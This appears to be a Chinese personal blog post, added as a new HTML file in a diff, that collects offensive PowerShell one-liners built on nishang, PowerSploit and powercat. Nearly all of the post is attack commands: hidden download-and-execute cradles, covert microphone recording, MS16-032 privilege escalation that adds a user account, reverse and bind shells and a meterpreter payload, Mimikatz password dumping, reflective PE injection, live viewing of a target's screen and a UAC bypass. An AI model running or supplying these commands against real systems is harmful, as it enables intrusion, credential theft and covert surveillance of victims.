@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="个人笔记,学习笔记"><title>Powershell的一些Commands收集 | B1ack2heep | 探索者</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Powershell的一些Commands收集</h1><a id="logo" href="/.">B1ack2heep | 探索者</a><p class="description">学习笔记,探索经历</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Powershell的一些Commands收集</h1><div class="post-meta">Jul 13, 2017</div><div class="post-content"><p>#Powershell的一些Commands收集<br>传送门:<br><a href="https://github.com/samratashok/nishang" target="_blank" rel="external">nishang</a><br><a href="https://github.com/besimorhino/powercat" target="_blank" rel="external">powercat</a><br><a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="external">powersploit</a></p>
+<p>首先是基础的命令</p>
+<blockquote>
+<p>. .\*.ps1  </p>
+</blockquote>
+<p>加载文件 注意中间的空格</p>
+<p>##下载文件的两种方式</p>
+<blockquote>
+<p> (New-Object System.Net.Webclient).DownloadString()<br>   (New-Object System.Net.Webclient).DownloadFile()</p>
+</blockquote>
+<p>载入文件并执行</p>
+<blockquote>
+<p> powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://192.168.1.1:80/shell&#39;));shell" target="_blank" rel="external">http://192.168.1.1:80/shell&#39;));shell</a>“<br> powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(‘127.0.0.1//text.jpg’,’C:\Users\Public\test.jpg’) &amp; start C:\Users\Public\test.jpg</p>
+</blockquote>
+<p>##录音</p>
+<blockquote>
+<p>powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&#39;);Get-MicrophoneAudio" target="_blank" rel="external">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&#39;);Get-MicrophoneAudio</a> -Path $env:TEMP\secret.wav -Length 10 -Alias ‘SECRET’”</p>
+</blockquote>
+<p>##提权加账号<br>使用ms16-032提权</p>
+<blockquote>
+<p>Invoke-MS16-032 -Application cmd.exe -commandline ‘/c net user test123 test123 /add’”<br><a href="https://github.com/Jens472/Invoke-MS16-032" target="_blank" rel="external">https://github.com/Jens472/Invoke-MS16-032</a></p>
+</blockquote>
+<p>##shell连接<br>使用nishang框架的shells目录下工具</p>
+<blockquote>
+<p>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://ip/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp" target="_blank" rel="external">http://ip/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp</a> -Reverse -IPAddress ip -port 8888</p>
+</blockquote>
+<p>同时使用nc来接受反向连接shell</p>
+<blockquote>
+<p>nc -lvvp 8888</p>
+</blockquote>
+<p>反弹meterpreter(使用powersploit)</p>
+<blockquote>
+<p>IEX(New-Object Net.WebClient).DownloadString(‘<a href="http://ip/CodeExecution/Invoke-Shellcode-Old.ps1" target="_blank" rel="external">http://ip/CodeExecution/Invoke-Shellcode-Old.ps1</a>‘)<br>Invoke-Shellcode -payload windows/meterpreter/reverse_https -lhost ip -lport 4444 -force</p>
+</blockquote>
+<p>直连<br>目标机</p>
+<blockquote>
+<p>Invoke-PowerShellTcp -Bind -Port 8888</p>
+</blockquote>
+<p>攻击机使用powercat连接</p>
+<blockquote>
+<p>powercat -c 192.168.52.1 -v -p 8888</p>
+</blockquote>
+<p>##Mimikatz脱密码<br>powersploit中</p>
+<blockquote>
+<blockquote>
+<p>IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz" target="_blank" rel="external">http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</a></p>
+</blockquote>
+</blockquote>
+<p>##PE注入<br>powersploit框架中的</p>
+<blockquote>
+<p>Invoke-ReflectivePEInjection<br>Invoke-DllInjection<br>Invoke-Shellcode</p>
+</blockquote>
+<p>在这里我只介绍下Invoke-ReflectivePEInjection的用法</p>
+<blockquote>
+<p>$p=[IO.File]::ReadAllBytes(‘shell.exe’)<br>Invoke-ReflectivePEInjection -PEBytes $p -ForceASLR          #新版本</p>
+</blockquote>
+<p>貌似在老版本才支持<code>-PEUrl</code>和<code>-PEPath</code>参数</p>
+<blockquote>
+<p>Invoke-ReflectivePEInjection -PEUrl <a href="http://192.168.1.101:8000//shell.exe" target="_blank" rel="external">http://192.168.1.101:8000//shell.exe</a>  -ForceASLR<br>Invoke-ReflectivePEInjection -PEPath .\shell.exe -ForceASLR</p>
+</blockquote>
+<p>同时可实现远程加载’无文件’渗透</p>
+<p>##获取实时屏幕<br>使用nishang的Show-TargetScreen.ps1脚本(需要使用火狐浏览器<br>bind模式</p>
+<blockquote>
+<p>Show-TargetScreen -Bind -Port port</p>
+</blockquote>
+<p>reverse模式</p>
+<blockquote>
+<p>Show-TargetScreen -Reverse -IPAddress ip -Port port</p>
+</blockquote>
+<p>##Powerup提权<br>使用powersploit中的powerup</p>
+<blockquote>
+<p>. .\powerup.ps1<br>Invoke-AllChecks</p>
+</blockquote>
+<p>在<code>AbuseFunction</code>中显示利用的代码</p>
+<p>以<code>wampmysqld</code>为例</p>
+<blockquote>
+<p>ServiceName    : wampmysqld<br>Path           : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe wampmysqld<br>ModifiableFile : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe<br>StartName      : LocalSystem<br>AbuseFunction  : Install-ServiceBinary -ServiceName ‘wampmysqld’</p>
+<p>Install-ServiceBinary -ServiceName ‘wampmysqld’  -UserName 123 -Password 123</p>
+</blockquote>
+<p>当管理员运行后会自动添加账号</p>
+<p>最后在恢复文件</p>
+<blockquote>
+<p>Restore-ServiceBinary -ServiceName ‘wampmysqld’</p>
+</blockquote>
+<p>ms16-032提权:)</p>
+<p>##bypass UAC<br>nishang中的Invoke-PsUACme<br>直接载入Invoke-PsUACme,然后</p>
+<blockquote>
+<p>Invoke-PsUACme</p>
+</blockquote>
+<p>即可<br>其中有几个参数<br><code>-payload</code>:直接输入执行的命令,执行某个自定义程序需要在payload出填写绝对路径<br><code>-payloadpath</code>:加载的payload路径<br><code>-CustomDll64(32)</code>:加载自定义dll</p>
+<p>Ps:歪果仁对bypassUAC研究的博客<a href="https://enigma0x3.net/?s=uac" target="_blank" rel="external">https://enigma0x3.net/?s=uac</a></p>
+<p><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="external">UACME</a></p>
+</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://qinshenhui.github.io/2017/07/13/Powershell的一些Commands收集/" data-id="cj53fb5qb0001e4fp763yhl65" class="article-share-link">分享到</a><div class="tags"><a href="/tags/powershell/">powershell</a></div><div class="post-nav"><a href="/2017/03/23/debug基本用法/" class="next">debug基本用法</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="http://qinshenhui.github.io"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/汇编/">汇编</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/语言学习/">语言学习</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/powershell/" style="font-size: 15px;">powershell</a> <a href="/tags/汇编/" style="font-size: 15px;">汇编</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/环境搭建/" style="font-size: 15px;">环境搭建</a> <a href="/tags/python/" style="font-size: 15px;">python</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/07/13/Powershell的一些Commands收集/">Powershell的一些Commands收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/23/debug基本用法/">debug基本用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/02/screenshot/">使用Python实现简单抓图</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/26/mdk3工具/">mdk3工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/25/使用Hexo在github上部署属于自己的个人博客/">使用Hexo在github上部署属于自己的个人博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/24/Hello-World/">Hello World!</a></li></ul></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">B1ack2heep | 探索者.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
